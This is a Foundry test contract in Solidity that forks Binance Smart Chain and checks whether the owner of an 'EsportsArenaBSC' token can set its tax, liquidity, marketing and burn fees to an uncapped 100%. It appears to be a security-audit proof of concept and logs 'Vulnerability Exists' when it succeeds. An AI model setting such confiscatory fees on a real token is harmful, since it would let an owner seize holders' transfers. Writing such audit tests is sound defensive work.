// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/EsportsArenaBSC.sol";

contract FeeManipulationTest is Test {
    EsportsArenaBSC token;
    address owner = address(0x1);
    uint256 highFee = 100; // 100% fee

    function setUp() public {
        // Fork Binance Smart Chain mainnet
        uint256 forkId = vm.createFork("https://bsc-dataseed.binance.org/");
        vm.selectFork(forkId);
        
        // Start deploying as owner
        vm.startPrank(owner);
        token = new EsportsArenaBSC();
        vm.stopPrank();
    }

    function testUncappedFeeManipulation() public {
        // Record initial fee states
        console.log("--- BEFORE-Trigger Fee Values ---");
        uint256 taxFeeBefore = token._taxFee();
        uint256 liquidityFeeBefore = token._liquidityFee();
        uint256 marketingFeeBefore = token._marketingFee();
        uint256 burnFeeBefore = token._burnFee();
        
        console.log("Initial taxFee:", taxFeeBefore);
        console.log("Initial liquidityFee:", liquidityFeeBefore);
        console.log("Initial marketingFee:", marketingFeeBefore);
        console.log("Initial burnFee:", burnFeeBefore);
        console.log("");

        // Perform the attack - set all fees to 100%
        console.log("--- Trigger Attack: Set All Fees to 100% ---");
        vm.prank(owner);
        token.setTaxFeePercent(highFee);
        
        vm.prank(owner);
        token.setLiquidityFeePercent(highFee);
        
        vm.prank(owner);
        token.setMarketingFeePercent(highFee);
        
        vm.prank(owner);
        token.setBurnFeePercent(highFee);
        console.log("");

        // Record post-attack fee states
        console.log("--- AFTER-Trigger Fee Values ---");
        uint256 taxFeeAfter = token._taxFee();
        uint256 liquidityFeeAfter = token._liquidityFee();
        uint256 marketingFeeAfter = token._marketingFee();
        uint256 burnFeeAfter = token._burnFee();
        
        console.log("Post-attack taxFee:", taxFeeAfter);
        console.log("Post-attack liquidityFee:", liquidityFeeAfter);
        console.log("Post-attack marketingFee:", marketingFeeAfter);
        console.log("Post-attack burnFee:", burnFeeAfter);
        console.log("");

        // Differential check - verify all fees were set to 100%
        console.log("=== Verification Result ===");
        bool allFeesManipulated = (taxFeeAfter == highFee) &&
                                 (liquidityFeeAfter == highFee) &&
                                 (marketingFeeAfter == highFee) &&
                                 (burnFeeAfter == highFee);
        
        if (allFeesManipulated) {
            console.log("Vulnerability Exists: Owner can set all fees to uncapped 100% values");
            console.log("Vulnerability Exists: Uncapped fee parameter modification");
        } else {
            console.log("Vulnerability not Exist: Fee parameters are properly validated");
        }
    }
}